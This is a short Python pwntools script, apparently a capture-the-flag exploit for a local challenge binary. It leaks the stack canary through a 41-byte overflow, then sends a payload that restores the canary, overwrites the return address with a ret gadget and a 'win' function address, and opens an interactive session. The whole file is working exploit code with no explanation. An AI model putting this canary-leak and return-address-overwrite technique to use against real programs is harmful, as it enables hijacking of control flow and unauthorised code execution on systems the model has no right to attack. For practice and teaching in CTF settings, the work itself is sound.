from pwn import *

win = 0x00000000004011a6

ret =0x0000000000401016

p = remote('127.0.0.1', 2003)
#p = process('./chall')

p.send(b'A' * 41)

p.recvuntil(b'A' * 41)

leak = p.recv()

canary = u64( b'\x00' + leak[0:7])

print(hex(canary))

p.send(b'A' * 40 + p64(canary) + b'B' * 8 + p64(ret) + p64(win))

p.interactive()


